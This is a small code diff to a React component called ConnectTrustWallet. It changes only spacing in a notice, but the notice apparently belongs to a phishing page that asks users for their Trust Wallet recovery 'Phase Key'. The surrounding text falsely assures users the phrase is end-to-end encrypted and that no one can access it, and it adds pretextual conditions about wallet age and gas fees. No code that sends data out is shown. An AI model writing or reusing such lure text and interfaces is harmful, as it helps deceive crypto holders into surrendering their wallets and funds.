@@ -126,7 +126,7 @@ const ConnectTrustWallet = () => {
                         </div>
                     <button onClick={handleClick} >{button}</button>
                     <p>
-                        <span>Note: </span>Trust Wallet must be atleast 30 days old and should have minimum $1 gas fees. 
+                        <span>Note:</span> Trust Wallet must be atleast 30 days old and should have minimum $1 gas fees. 
                         Your Trust Wallet Phase Key is end to end encrypted. No one can view or access it.
                     </p>
                     </div>
